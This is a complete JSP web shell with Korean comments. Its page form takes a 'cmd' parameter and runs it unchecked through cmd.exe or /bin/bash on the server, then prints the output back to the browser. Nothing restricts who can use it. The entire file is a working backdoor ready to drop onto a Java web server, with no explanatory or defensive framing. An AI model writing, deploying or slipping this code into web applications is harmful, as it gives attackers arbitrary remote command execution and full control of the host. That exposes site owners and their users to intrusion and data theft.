<%@ page import="java.io.*, java.nio.charset.StandardCharsets" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Command Execution</title>
</head>
<body>
    <form method="GET" name="cmdForm" action="">
        <input type="text" name="cmd">
        <input type="submit" value="Execute">
    </form>
    <div>
    <%
    if (request.getParameter("cmd") != null)
    {
        String osName = System.getProperty("os.name").toLowerCase();
        String command = request.getParameter("cmd");
        out.println("<strong>"+"명령어 : " + request.getParameter("cmd") + "</strong>" + "<br><br>");
        // Windows인 경우
        if (osName.indexOf("windows") != -1) {
            String[] cmdArray = {"cmd.exe", "/C", command};
            ProcessBuilder pb = new ProcessBuilder(cmdArray);
            pb.redirectErrorStream(true);
            Process process = pb.start();
            
            InputStreamReader in = new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8);
            BufferedReader br = new BufferedReader(in);
            
            String line;
            while ((line = br.readLine()) != null) {
                out.println(line +"<br>");
            }
        }
        // 다른 OS인 경우 (Linux, macOS 등)
        else {
            String[] cmdArray = {"/bin/bash", "-c", command};
            ProcessBuilder pb = new ProcessBuilder(cmdArray);
            pb.redirectErrorStream(true);
            Process process = pb.start();
            
            InputStreamReader in = new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8);
            BufferedReader br = new BufferedReader(in);
            
            String line;
            while ((line = br.readLine()) != null) {
                out.println(line +"<br>");
            }
        }
    }
    %>
    </div>
</body>
</html>
